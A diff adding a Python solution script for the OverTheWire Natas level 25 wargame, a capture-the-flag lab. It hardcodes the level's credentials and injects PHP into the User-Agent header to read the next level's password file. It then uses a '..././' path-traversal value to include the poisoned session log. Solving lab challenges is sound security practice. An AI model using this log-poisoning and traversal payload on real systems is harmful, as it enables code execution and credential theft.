@@ -1,0 +1,17 @@
+import requests
+import re
+username = 'natas25'
+password = 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws'
+url = 'http://natas25.natas.labs.overthewire.org' 
+session = requests.Session()
+
+headers ={"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
+
+response = session.get(url, auth = (username, password))
+response = session.post(url, headers = headers, data = {
+    "lang" :
+    "..././..././..././..././..././var/www/natas/natas25/logs/natas25_"
+    + session.cookies['PHPSESSID'] + ".log"
+}, auth = (username,password))
+
+print(response.text)
